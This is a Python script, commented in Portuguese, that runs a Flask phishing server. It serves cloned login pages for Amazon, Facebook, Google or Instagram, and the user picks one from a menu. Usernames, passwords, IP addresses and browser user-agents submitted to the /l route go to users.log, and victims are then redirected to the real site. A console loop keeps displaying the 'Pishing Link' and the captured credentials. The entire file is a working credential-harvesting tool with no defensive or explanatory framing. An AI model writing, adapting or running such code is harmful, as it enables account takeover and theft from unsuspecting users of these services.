#!/bin/python3
# Libs
import wget, platform, os, time, threading

# Cores
vermelho = '\033[31m'
verde = '\033[32m'
azul = '\033[34m'

ciano = '\033[36m'
magenta = '\033[35m'
amarelo = '\033[33m'
preto = '\033[30m'
r = '\033[0;0m'
negrito = '\033[1m'


# inicia  o server
def start(path, redirecter):

    # conferindo users.log existe 
    try:
        open('users.log', 'r')
    except:
        open('users.log', 'w')
    
    rd = open(redirecter, 'r').read()
   
    # sub-imports 
    from flask import (Flask, render_template, request, redirect, session, jsonify)
    app = Flask(__name__)

    # rotas para flask
    @app.route('/l', methods = ['POST', 'GET'])
    def login():

        ar = open('users.log', 'a')
        u = request.form.get('user')
        p = request.form.get('pwd')  

        # pegando user agent
        agent = request.headers.get('User-Agent')
        
        # pegando ip
        if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
            ip = request.environ['REMOTE_ADDR']
            ar.write(f"({ip}): User: {u}, Senha: {p}, Agent: {agent}\n")
            return redirect(rd)
        else:
            ip = request.environ['HTTP_X_FORWARDED_FOR']
            ar.write(f"({ip}): User: {u}, Senha: {p}, Agent: {agent}\n")
            return redirect(rd)
        
        
        print("Pishing !!")

       


    @app.route('/')
    def index():
        html = open(path, 'r').read()
        return html

    t = threading.Thread(target=app.run) # deixa o servidor em uma thread mas nao executa
    t.start() # executa o servidor

    while True: # executa o loop ao mesmo tempo que o servidor
        try:
            os.system('clear')
            lg = open('users.log', 'r').read()

            print(f"{negrito}Pishing Link:{r} {verde}http://127.0.0.1:{negrito}5000{r}")
            print(f"\nLogs:\n{negrito}", lg, f"{r}")
            
            print(f"\n{amarelo}Await ...{r}\n")
            time.sleep(3.30)
            os.system('clear')

        except KeyboardInterrupt:
            t._stop()
            os.system('clear')
            break



os.system('clear')
print("Chose Option")
print("1 Amazon  \t 3 Google")
print("2 Facebook\t 4 Instagram")

option = input(">> ")

# para cada opção ele inicia o servidor com o index e o redirect pos pishsing.
if option == '1':
    start(path="./pages/amazon/index.html", redirecter="./pages/amazon/redirect.txt")
    print("Ok")

if option == '2':
    start(path="./pages/facebook/index.html", redirecter="./pages/facebook/redirect.txt")
if option == '3':
    start(path="./pages/google/index.html", redirecter="./pages/google/redirect.txt")
if option == '4':
    start(path="./pages/instagram/index.html", redirecter="./pages/instagram/redirect.txt")